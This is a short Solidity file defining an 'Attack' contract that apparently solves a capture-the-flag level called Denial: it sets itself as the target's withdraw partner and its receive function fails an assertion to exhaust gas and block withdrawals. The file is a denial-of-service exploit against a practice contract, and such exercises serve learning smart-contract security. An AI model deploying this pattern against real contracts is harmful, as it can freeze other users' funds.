pragma solidity ^0.6.0;

import "./default.sol";

contract Attack {
    Denial denial;
    bool ha = false;

    constructor(address payable _denial) public {
        denial = Denial(_denial);
    }

    function setPartner() public {
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        assert(ha);
    }
}
